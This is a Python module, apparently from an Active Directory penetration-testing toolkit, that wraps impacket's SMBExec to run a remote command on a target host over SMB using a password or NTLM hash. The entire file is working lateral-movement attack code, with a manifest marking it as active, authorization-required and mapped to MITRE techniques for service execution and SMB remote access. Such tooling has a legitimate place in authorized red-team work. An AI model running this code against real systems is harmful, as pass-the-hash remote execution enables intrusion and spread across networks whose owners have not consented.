"""SMBExec — semi-interactive shell via SMB (no binary upload)."""

from __future__ import annotations

import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.smbexec.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["smb_service_creation", "remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1569.002", "T1021.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    if not cred.has_password and not cred.has_hash:
        print("[!] SMBExec requires credentials", file=sys.stderr)
        return 1

    print(f"[*] SMBExec → {args.target} ({args.domain}\\{cred.username})")

    try:
        from impacket.examples.smbexec import CMDEXEC
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        executer = CMDEXEC(
            "whoami", username=cred.username, password=cred.password or "",
            domain=args.domain, hashes=cred.impacket_hash if cred.has_hash else None,
            share="C$", mode="SHARE",
        )
        executer.run(args.target)
        print("[+] SMBExec command executed")
        return 0
    except Exception as exc:
        print(f"[-] SMBExec failed: {exc}", file=sys.stderr)
        return 1
